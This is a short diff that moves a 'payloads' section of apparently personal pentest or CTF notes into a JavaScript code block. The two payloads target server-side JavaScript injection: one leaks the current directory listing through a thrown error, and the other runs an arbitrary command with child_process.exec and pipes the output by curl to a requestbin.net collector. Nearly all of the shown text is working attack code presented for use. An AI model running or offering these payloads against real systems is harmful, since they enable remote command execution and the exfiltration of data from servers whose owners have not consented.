@@ -4,6 +4,8 @@
 
 payloads:
 
-	(()=>{throw `${JSON.stringify(fs.readdirSync("."))}`})()
+```javascript
+(()=>{throw `${JSON.stringify(fs.readdirSync("."))}`})()
 
-	require("child_process").exec("{cmd} | curl https://requestbin.net/xxxxxx -T -");
+require("child_process").exec("{cmd} | curl https://requestbin.net/xxxxxx -T -");
+```
